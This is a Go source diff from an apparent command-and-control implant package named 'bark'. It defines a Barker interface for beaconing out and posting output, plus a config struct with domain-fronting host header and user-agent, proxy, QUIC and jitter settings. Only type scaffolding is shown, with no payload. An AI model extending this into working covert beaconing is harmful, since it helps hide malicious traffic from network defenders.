@@ -1,26 +1,33 @@
 package bark
 
-type barker interface {
+import "net/http"
+
+type Barker interface {
 	beaconOut(string) ([]byte, error)
 	postOutput(string, []byte) ([]byte, error)
 }
 
 var (
-	Barkers = make(map[string]barker)
+	Barkers = make(map[string]Barker)
 )
 
-func init() {
+type BarkConfig struct {
+	//addr
+	BarkHost string
 
-}
+	//Host Header and user-agent (for domain fronting)
+	DF bool
+	Hh string
+	Ua string
 
-// Beacon out over the current valid protocol.
-func Register(name string, url string) ([]byte, error) {
-	var body []byte
-	var err error
+	Proxyurl  string
+	Proxyuser string
+	Proxy     bool
 
-	body, err = Barkers[name].beaconOut(url)
-	return body, err
-
+	//transport
+	QUIC bool
+	Jit  float64
+	tr   http.RoundTripper
 }
 
 // Beacon out over the current valid protocol.
